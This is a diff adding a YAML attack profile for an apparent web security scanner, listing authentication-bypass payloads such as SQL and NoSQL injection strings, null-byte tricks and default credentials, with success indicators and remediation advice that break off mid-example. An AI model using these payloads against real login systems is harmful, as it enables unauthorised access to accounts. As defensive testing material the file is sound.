@@ -1,0 +1,155 @@
+# Authentication Bypass Attack Profile
+# This file defines payloads for testing authentication bypass vulnerabilities
+
+name: "Authentication Bypass"
+category: "authentication"
+severity: "critical"
+description: "Tests for common authentication bypass techniques including SQL injection, NoSQL injection, and logic flaws"
+
+# Fields commonly vulnerable to authentication bypass
+target_fields:
+  - "username"
+  - "email"
+  - "password"
+  - "login"
+  - "user"
+  - "token"
+  - "session"
+  - "auth"
+  - "credential"
+
+# Attack payloads to test
+payloads:
+  # Empty/null bypass attempts
+  - ""
+  - " "
+  - "null"
+  - "NULL"
+  - "undefined"
+  - "0"
+  
+  # Default/common credentials
+  - "admin"
+  - "administrator"
+  - "root"
+  - "admin:admin"
+  - "admin:password"
+  - "root:root"
+  - "test:test"
+  
+  # SQL-based authentication bypass
+  - "admin'--"
+  - "admin' --"
+  - "admin'#"
+  - "' OR '1'='1"
+  - "' OR '1'='1'--"
+  - "' OR 1=1--"
+  - "admin' OR '1'='1"
+  - "admin' OR '1'='1'--"
+  - "' OR 'x'='x"
+  - "') OR ('1'='1"
+  - "') OR '1'='1'--"
+  - "' OR ''='"
+  - "admin' OR 1=1#"
+  - "' UNION SELECT NULL--"
+  
+  # NoSQL injection bypass
+  - '{"$gt": ""}'
+  - '{"$ne": null}'
+  - '{"$ne": ""}'
+  - '{"$regex": ".*"}'
+  - '{"$exists": true}'
+  - '{"$nin": []}'
+  - '[$ne]=1'
+  - '{"username": {"$ne": null}, "password": {"$ne": null}}'
+  
+  # Special character bypass
+  - "admin\x00"
+  - "admin%00"
+  - "admin\n"
+  - "admin%0d%0a"
+  - "admin\r\n"
+  
+  # Unicode/encoding bypass
+  - "admin%20"
+  - "admin%09"
+  - "﻿admin"
+  - "admin\u0000"
+  
+  # Logic flaw attempts
+  - "true"
+  - "false"
+  - "1"
+  - "-1"
+  - "999999"
+
+# Indicators that suggest successful bypass
+success_indicators:
+  response_contains:
+    - "welcome"
+    - "dashboard"
+    - "logged in"
+    - "login successful"
+    - "authentication successful"
+    - "success"
+    - "profile"
+    - "logout"
+    - "session"
+    - "redirect"
+  
+  status_codes:
+    - 200
+    - 302
+    - 301
+    - 303
+  
+  absence_of:
+    - "invalid"
+    - "incorrect"
+    - "failed"
+    - "error"
+    - "denied"
+    - "unauthorized"
+    - "forbidden"
+    - "wrong password"
+    - "authentication failed"
+    - "login failed"
+
+# How to fix this vulnerability
+remediation: |
+  Implement secure authentication mechanisms to prevent bypass attempts.
+  
+  Best practices:
+  
+  1. Input Validation:
+    - Validate and sanitize all user inputs
+    - Reject suspicious patterns and special characters
+    - Implement strict type checking
+  
+  2. Secure Query Practices:
+    - Use parameterized queries/prepared statements
+    - Avoid dynamic query construction
+    - Never concatenate user input into authentication queries
+  
+  3. Authentication Controls:
+    - Implement proper password hashing (bcrypt, Argon2, PBKDF2)
+    - Use secure session management
+    - Implement account lockout after failed attempts
+    - Add rate limiting to prevent brute force
+  
+  4. Multi-Factor Authentication:
+    - Enable MFA/2FA when possible
+    - Use time-based one-time passwords (TOTP)
+  
+  5. Monitoring and Logging:
+    - Log all authentication attempts
+    - Monitor for unusual patterns
+    - Alert on multiple failed attempts
+  
+  Example (Python with Flask):
+  
+  # ❌ BAD - Vulnerable to SQL injection bypass
+  query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+  user = db.execute(query)
+  
+  # ✅ GOOD - Secure authentication
